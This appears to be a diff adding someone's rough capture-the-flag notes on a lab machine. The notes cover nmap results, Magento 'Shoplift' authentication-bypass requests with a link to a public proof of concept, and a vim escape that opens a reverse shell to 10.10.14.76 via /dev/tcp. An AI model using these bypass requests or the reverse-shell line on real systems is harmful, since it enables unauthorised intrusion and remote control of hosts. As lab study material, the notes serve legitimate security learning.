@@ -1,0 +1,57 @@
+PORT   STATE SERVICE VERSION
+  22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+  80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+   http-enum: 
+     /app/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
+     /errors/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
+     /includes/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
+     /lib/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
+       _http-server-header: Apache/2.4.18 (Ubuntu)
+     Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+# reference solution:
+#   https://github.com/joren485/Magento-Shoplift-SQLI/blob/master/poc.py
+# https://blog.checkpoint.com/2015/04/20/analyzing-magento-vulnerability/
+  # a GET request transforms:
+    GET /index.php/[M]/[C]/[A] HTTP/1.1
+  # into:
+    MAGE_[M]_[C]Controller 
+    
+
+  # index.php/module/controller/action
+  # examples:
+    # general form:
+    - GET /index.php/M/C/A
+        ^a class is created called: MAGE_M_CCONTROLLER
+
+    # normal requests
+    - GET /index.php/downloadable/file/ HTTP/1.1
+        ^a class called: Mage_Downloadable_FileController
+
+    # admin requests are special, but just appends "Admin" to the controller
+    - GET /index.php/admin/downloadable/file/ HTTP/1.1
+        ^a class called: Mage_Downloadable_Adminhtml_Downloadable_FileController
+
+    # abuse the dumb appending of "admin". The following looks like an admin
+    # resquest. No auth is done if abused this way and you can call almost any
+    # admin controller (small attack surface, but still abuseable):
+    - GET /index.php/downloadable/Adminhtml_Downloadable_File/ HTTP/1.1
+        ^a class called: Mage_Downloadable_Adminhtml_Downloadable_FileController
+
+    # requests that are 'forwarded' bypass authentication checks:
+    # python requests:
+    # https://2.python-requests.org/en/master/user/quickstart/#custom-headers
+      if (!$request->getParam('forwarded'))
+
+function: block 
+p1:       type=Adminhtml/report_search_grid 
+p2:       output=getCsvFile
+
+
+... confusing aftewards... somehow sqli into db with an admin and we inject
+    a plugin so to reverse shell
+
+
+# sudo -l tells you we can use vi on a directory. in vim you can then:
+    ':!bash -i >& /dev/tcp/10.10.14.76/7001 0>&1'
+
